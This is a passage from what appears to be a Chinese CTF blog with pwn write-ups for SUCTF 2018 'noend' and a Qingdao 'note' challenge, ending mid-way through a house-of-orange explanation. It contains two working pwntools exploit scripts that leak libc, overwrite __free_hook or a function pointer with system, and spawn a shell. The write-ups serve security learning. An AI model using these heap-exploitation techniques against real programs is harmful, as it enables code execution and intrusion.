<p>由于malloc返回了0，buf的值为0，read就是向0中写入内容，而<code>*(buf+size-1)=0</code>这一块，<strong>相当于向<code>*(size-1)</code>中写入0。</strong></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h3><p>在<code>_init_free</code>函数中，会对要释放的chunk的size做检查，检查发生在已经与前后块合并完成之后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">     <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">malloc_consolidate(av);</span><br><span class="line">    ……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果size大于设定的阈值，就会对fastbin进行合并（<code>malloc_consolidate</code>）。合并之后的块会放入到unsorted bin中（具体可以查看<code>malloc_consolidate</code>的源码），这时候将有机会利用unsorted bin泄露libc地址。</p>
<p>由于本题只对小于0x80的内存进行free，而且释放fastbin大小的块时是不会走到<code>malloc_consolidate</code>这一步的，所以可以通过malloc(0x7f)来触发<code>malloc_consolidate</code>：实际会分配0x90大小，属于small bin，释放的时候会与top合并，此时由于size大于阈值，由此触发fastbin合并操作。所以在0x7f之前再申请几块fastbin的内存。</p>
<p><em>注：fastbin的块即使在释放之后，P位也不会置0，在<code>malloc_consolidate</code>才会置0。</em></p>
<p>如果分别申请0x20和0x30，在合并之前它们分别呆在不同的fastbins里，然后执行<code>malloc_consolidate</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">      p = atomic_exchange_acq (fb, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">	  <span class="keyword">do</span> &#123;</span><br><span class="line">          check_inuse_chunk(av, p);</span><br><span class="line">          nextp = p-&gt;fd;</span><br><span class="line"></span><br><span class="line">          size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class="line">          <span class="comment">//根据size找到下一块及大小</span></span><br><span class="line">          nextchunk = chunk_at_offset(p, size);</span><br><span class="line">          nextsize = chunksize(nextchunk);</span><br><span class="line">          <span class="comment">//如果前一块是空闲块，合并</span></span><br><span class="line">          <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">            prevsize = p-&gt;prev_size;</span><br><span class="line">            size += prevsize;</span><br><span class="line">            p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">            unlink(av, p, bck, fwd);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">//下一块不是top</span></span><br><span class="line">          <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">            nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line">            <span class="comment">//下一块时空闲块，合并</span></span><br><span class="line">            <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">              size += nextsize;</span><br><span class="line">              unlink(av, nextchunk, bck, fwd);</span><br><span class="line">            &#125; <span class="keyword">else</span><span class="comment">//下一块不是空闲块，将下一块中记录本块是否空闲的P位置0</span></span><br><span class="line">              clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//将p放入到unsorted bin当中</span></span><br><span class="line">            first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">            unsorted_bin-&gt;fd = p;</span><br><span class="line">            first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">              p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">              p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            set_head(p, size | PREV_INUSE);</span><br><span class="line">            p-&gt;bk = unsorted_bin;</span><br><span class="line">            p-&gt;fd = first_unsorted;</span><br><span class="line">            set_foot(p, size);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">//下一块是top，合并</span></span><br><span class="line">          <span class="keyword">else</span> &#123;</span><br><span class="line">            size += nextsize;</span><br><span class="line">            set_head(p, size | PREV_INUSE);</span><br><span class="line">            av-&gt;top = p;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">	   &#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>即0x20（实际0x30）的块先放入unsorted bin，此时它的fd和bk已经写好，然后0x30（实际0x40）的块先与0x20的块合并，然后又与后面的top合并，原来0x20的头变为top头。</p>
<p><img src="/2018/07/09/suctf2018-noend/heap.png" alt="heap"></p>
<p>此后再分配一块内存并写入前8字节，就能读取到原来0x20的bk指针了，由此泄露地址。</p>
<h3 id="劫持执行流"><a href="#劫持执行流" class="headerlink" title="劫持执行流"></a>劫持执行流</h3><p>参考<a href="https://changochen.github.io/2018/05/28/suctf/" target="_blank" rel="noopener">Ne0出题人大佬</a>的wp，用到了一个神奇的方法：事先写好一个字段作为top的大小，值为：<code>free_hook-top_addr + system_addr</code>，然后再从top分出<code>free_hook-top_addr</code> （大概为这个值）大小，并添加一些偏移，使得分配之后的top头中size字段正好能落在free_hook上，即将system_addr写入到free_hook。</p>
<p>之前在主分配区泄露了libc的地址，同样，我们也能泄露切换之后的分配区的top地址，原因是泄露地址时bk记录的是unsorted bin的地址，也就是实际内容-0x10处，而这个位置恰好记录的是top地址。</p>
<p><img src="/2018/07/09/suctf2018-noend/top.png" alt=""></p>
<p><img src="/2018/07/09/suctf2018-noend/UB.png" alt="这个header的前八个字节恰好是记录top的地址，而实际上这个header是不存在的，这里画出来是便于理解"></p>
<p>上面提到的事先写好一个字段为top的大小，然后是要通过malloc的漏洞，向某处写一个0。这个某处就可以是top的地址处，这样能让top向前提升几个字节，提升后能使top的大小正好为<code>free_hook-top_addr + system_addr</code>，之后再次malloc就会从修改后的top处分配内存，完成将system的地址写入到free_hook中。这里需要对写入的内容加入一些偏移，使得top的size字段对应于free_hook。</p>
<h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./noend'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">routine</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	time.sleep(<span class="number">0.3</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line">	p.recvuntil(content)</span><br><span class="line"></span><br><span class="line">routine(<span class="number">0x20</span>,<span class="string">'0gur0'</span>)<span class="comment">#0</span></span><br><span class="line">routine(<span class="number">0x30</span>,<span class="string">'0gur1'</span>)<span class="comment">#1</span></span><br><span class="line">routine(<span class="number">0x7f</span>,<span class="string">'0gur2'</span>)<span class="comment">#2</span></span><br><span class="line">routine(<span class="number">0x20</span>,<span class="string">'0'</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment">#泄露地址</span></span><br><span class="line">data = u64(p.recv()[:<span class="number">8</span>])</span><br><span class="line">offset = <span class="number">0x7f7c2d6dbb78</span><span class="number">-0x7f7c2d317000</span></span><br><span class="line">libc_base = data -offset</span><br><span class="line">sys_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.info(<span class="string">'sys_addr:%#x '</span>%sys_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#发送一个很大的size，从而切换到非主分配区</span></span><br><span class="line">p.sendline(str(libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]))</span><br><span class="line">time.sleep(<span class="number">0.3</span>)</span><br><span class="line">p.sendline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.clean()</span><br><span class="line"><span class="comment">#泄露非主分配区记录的top地址</span></span><br><span class="line">routine(<span class="number">0x20</span>,<span class="string">'0gur0'</span>)<span class="comment">#0</span></span><br><span class="line">routine(<span class="number">0x30</span>,<span class="string">'0gur1'</span>)<span class="comment">#1</span></span><br><span class="line">routine(<span class="number">0x7f</span>,<span class="string">'0gur2'</span>)<span class="comment">#2</span></span><br><span class="line">routine(<span class="number">0x20</span>,<span class="string">'0'</span>*<span class="number">8</span>)</span><br><span class="line">new_top = u64(p.recv()[:<span class="number">8</span>])</span><br><span class="line">log.info(<span class="string">'new_top:%#x '</span>%new_top)</span><br><span class="line"></span><br><span class="line"><span class="comment">#其中new_top+0x868对应于top的地址，注意new_top是记录这个值的地址</span></span><br><span class="line"><span class="comment">#+0x20是在top提升之后对应的地址</span></span><br><span class="line"><span class="comment">#-0x8是考虑到malloc时会向16对齐的问题</span></span><br><span class="line">routine(<span class="number">0xf0</span>,p64(sys_addr+libc_base+libc.symbols[<span class="string">'__free_hook'</span>]-(new_top+<span class="number">0x868</span>+<span class="number">0x20</span>)<span class="number">-0x8</span>)*(<span class="number">0xf0</span>/<span class="number">8</span>))</span><br><span class="line">p.sendline(str(new_top+<span class="number">1</span>))</span><br><span class="line">time.sleep(<span class="number">0.3</span>)</span><br><span class="line">p.sendline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.clean()</span><br><span class="line"></span><br><span class="line"><span class="comment">#设libc_base+libc.symbols['__free_hook']-(new_top+0x868+0x20)为offset，即当前top与free_hook之间的偏移为offset</span></span><br><span class="line"><span class="comment">#则上一步将top的size写成offset-8+sys_addr，此处分配了offset-16的大小</span></span><br><span class="line"><span class="comment">#在调试时查看到offset是以8结尾的，则malloc（offset-16），会进行（offset-16+8)对16向上取整，即实际分配offset-8大小的内存，则top的size恰好就变为sys_addr，而分配了offset-8之后，top地址正好挪到了free_hook-8处，则size正好写在了free_hook处</span></span><br><span class="line">routine(libc_base+libc.symbols[<span class="string">'__free_hook'</span>]-(new_top+<span class="number">0x868</span>+<span class="number">0x20</span>)<span class="number">-0x10</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">routine(<span class="number">0x10</span>,<span class="string">'/bin/sh'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://0gur1.cc/2018/06/27/青岛链湾杯-note/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="0gur1">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="0gur1">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/06/27/青岛链湾杯-note/" itemprop="url">青岛链湾杯--note</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-27T20:02:46+08:00">
                2018-06-27
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/06/27/青岛链湾杯-note/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2018/06/27/青岛链湾杯-note/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2018/06/27/青岛链湾杯-note/" class="leancloud_visitors" data-flag-title="青岛链湾杯--note">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  857字
                </span>
              

              

              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><em>废话：第一次打线下赛，确实很慌，该想到的东西都忘了，果然还是得多加练习啊QWQ</em></p>
<h2 id="基本逻辑"><a href="#基本逻辑" class="headerlink" title="基本逻辑"></a>基本逻辑</h2><p>菜单类小游戏：add，edit，show，delete，copy</p>
<p>add：添加结点，此处能够了解结点的结构</p>
<p><img src="/2018/06/27/青岛链湾杯-note/add.png" alt="add函数"></p>
<p><img src="/2018/06/27/青岛链湾杯-note/node.png" alt="结点的结构"></p>
<p>edit函数对结点的content进行编辑，但是这里的v3，v4，v1都没有进行初始化或者置零，将是本题的关键。</p>
<p><img src="/2018/06/27/青岛链湾杯-note/edit.png" alt="edit函数"></p>
<p>show函数，展示结点的content以及title。<strong>这个print函数是写在bss段的一个地址，通过调试发现写入的就是puts函数地址。</strong></p>
<p><img src="/2018/06/27/青岛链湾杯-note/show.png" alt="show函数"></p>
<p>copy函数，malloc出某结点size大小的块N次，N为用户输入。</p>
<p><img src="/2018/06/27/青岛链湾杯-note/copy.png" alt="copy函数"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>所有结点的地址以数组元素的形式存在于bss段中的s1[]中。前面已经说到了，在edit函数里，对存放size，content地址和结点地址的变量v1，v4和v3都没有进行初始化。发现这个问题的契机在于，当第二次edit某个结点content时，随意输入title都会提示“plz input new content”。没有初始化的后果就是，由于这些函数都会共用一块栈空间，比如show中的v3和edit中的v3地址都是ebp-0x120，v4都是ebp-0x118，导致当在show之后，v3和v4的值为刚刚操作过的结点的地址和content地址，而进入到edit函数中后即使输入的title没有匹配，也会执行向v4中写入v1个字节的操作，如果v4和v1不是同一结点的两个参数，那么就会导致溢出。</p>
<p>例如：v1为s1[1]中的size，而v3和v4是s1[0]中的参数，edit就会向v4中写入v1个字节，当v1大于s1[0]的size时，会造成溢出。溢出后就可以修改s1[0]中content的地址，之后再edit时就相当于相被修改的地址中写入内容。这里先把content0地址修改为print的地址，edit时向print的位置写入system@plt，再次show的时候就相当于执行system。</p>
<p><img src="/2018/06/27/青岛链湾杯-note/nodes.png" alt="堆上结点和content组织形式"></p>
<h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./note'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content,title)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'input choice:\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'input content size\n'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'input content\n'</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line">	p.recvuntil(<span class="string">'input note title\n'</span>)</span><br><span class="line">	p.sendline(title)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(title,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'input choice:\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'plz input title\n'</span>)</span><br><span class="line">	p.sendline(title)</span><br><span class="line">	p.recvuntil(<span class="string">'plz input new content\n'</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(title)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'input choice:\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'plz input title\n'</span>)</span><br><span class="line">	p.sendline(title)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">copy</span><span class="params">(title,num)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'input choice:\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'5'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'plz input title\n'</span>)</span><br><span class="line">	p.sendline(title)</span><br><span class="line">	p.recvuntil(<span class="string">'how many times do you want\n'</span>)</span><br><span class="line">	p.sendline(str(num))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'plz input your name\n'</span>)</span><br><span class="line">p.sendline(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">print_addr = <span class="number">0x602100</span></span><br><span class="line">sys_plt = <span class="number">0x400860</span></span><br><span class="line"><span class="comment">#0</span></span><br><span class="line">add(<span class="number">128</span>,<span class="string">"0gur0"</span>,<span class="string">"0"</span>)</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">add(<span class="number">256</span>,<span class="string">"0gur1"</span>,<span class="string">"1"</span>)</span><br><span class="line"><span class="comment">#2</span></span><br><span class="line">add(<span class="number">256</span>,<span class="string">"/bin/sh"</span>,<span class="string">"/bin/sh"</span>)</span><br><span class="line"><span class="comment">#edit 1 v1=256</span></span><br><span class="line">edit(<span class="string">"1"</span>,<span class="string">"new 0gur1"</span>)</span><br><span class="line"><span class="comment">#show 0 v3=s[0] v4=s[0].content</span></span><br><span class="line">show(<span class="string">"0"</span>)</span><br><span class="line"><span class="comment">#edit content0's addr</span></span><br><span class="line">payload =<span class="string">'a'</span>*<span class="number">128</span><span class="comment">#content0</span></span><br><span class="line">payload +=p64(<span class="number">0</span>)+p64(<span class="number">0x35</span>) <span class="comment">#node0 chunk header</span></span><br><span class="line">payload+=p64(<span class="number">48</span>)+p64(<span class="number">0</span>)+p64(<span class="number">128</span>)+p64(print_addr) <span class="comment">#node0</span></span><br><span class="line">edit(<span class="string">"hhh"</span>,payload)</span><br><span class="line"><span class="comment">#edit 0</span></span><br><span class="line">edit(<span class="string">"0"</span>,p64(sys_plt))</span><br><span class="line"></span><br><span class="line"><span class="comment">#show:print-&gt;system</span></span><br><span class="line">show(<span class="string">'/bin/sh'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>PS：一个还没有解决的问题，malloc按理说应该是在堆上进行分配的，但是本题查看分配的地址，都是以0x7f开头的，比较像栈上的地址，而且即使分配了多个块，top chunk的大小都不变…</p>
<p><img src="/2018/06/27/青岛链湾杯-note/heap.png" alt="分配的结点地址"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://0gur1.cc/2018/06/05/suctf2018-note/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="0gur1">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="0gur1">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/06/05/suctf2018-note/" itemprop="url">suctf2018-note</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-05T23:54:33+08:00">
                2018-06-05
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/06/05/suctf2018-note/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2018/06/05/suctf2018-note/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2018/06/05/suctf2018-note/" class="leancloud_visitors" data-flag-title="suctf2018-note">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  2,671字
                </span>
              

              

              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="house-of-orange-–-note"><a href="#house-of-orange-–-note" class="headerlink" title="house of orange – note"></a>house of orange – note</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><ol>
<li><p>unsorted bin的解链操作没有类似于malloc中<code>p-&gt;fd-&gt;bk == p</code>的检查</p>
</li>
<li><p>small bins和fastbin存在内存大小相等的区域，例如32位操作系统，fastbin的chunk为64字节以下的16，24,32……；同时，small bins的大小也是从16开始依次相差8字节的chunk大小。但是两者不在同一个位置，fastbin有自己的位置，small bins位于bins数组中。当释放的内存在64B以下时，会直接放入fastbin中；unsorted bin中的chunk最终会放入到small bins中。</p>
</li>
<li><p><strong>house of orange(堆地址未知的情况)</strong></p>
<p>这里省去了修改top大小的部分，修改top大小是为了重新分配一个top，把旧top放入到unsorted bin中，以利用unsorted bin的各种攻击。适用于没有unsorted bin的情况下，如果程序中有unsorted bin，可以省略这部分。</p>
<p>house of orange的原理是，调用<code>malloc</code>时，利用unsorted bin中错误的FD/BK指针，触发<code>malloc_printerr</code>函数打印错误信息，<code>malloc_printerr</code>调用<code>__libc_message</code>，<code>_libc_message</code>调用<code>abort()</code>，<code>abort()</code>调用<code>_IO_flush_all_lockp</code>。在<code>_IO_flush_all_lockp</code>中，通过对链表结构<code>_IO_list_all</code>中的每个结点进行遍历，找到符合条件的结点，执行<code>_IO_OVERWRITE</code>函数，其中结点是<code>_IO_FILE_PLUS</code>类型的结构体，对函数的查找需要通过<code>vtable</code>定位函数表。</p>
<p>通过代码来具体查看，<code>malloc_printerr</code>用于打印错误信息，位于malloc.c中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">malloc_printerr (<span class="keyword">int</span> action, <span class="keyword">const</span> <span class="keyword">char</span> *str, <span class="keyword">void</span> *ptr, mstate ar_ptr)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Avoid using this arena in future.  We do not attempt to synchronize this</span></span><br><span class="line"><span class="comment">     with anything else because we minimally want to ensure that __libc_message</span></span><br><span class="line"><span class="comment">     gets its resources safely without stumbling on the current corruption.  */</span></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr)</span><br><span class="line">    set_arena_corrupt (ar_ptr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((action &amp; <span class="number">5</span>) == <span class="number">5</span>)</span><br><span class="line">    __libc_message (action &amp; <span class="number">2</span>, <span class="string">"%s\n"</span>, str);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (action &amp; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">char</span> buf[<span class="number">2</span> * <span class="keyword">sizeof</span> (<span class="keyword">uintptr_t</span>) + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">      buf[<span class="keyword">sizeof</span> (buf) - <span class="number">1</span>] = <span class="string">'\0'</span>;</span><br><span class="line">      <span class="keyword">char</span> *cp = _itoa_word ((<span class="keyword">uintptr_t</span>) ptr, &amp;buf[<span class="keyword">sizeof</span> (buf) - <span class="number">1</span>], <span class="number">16</span>, <span 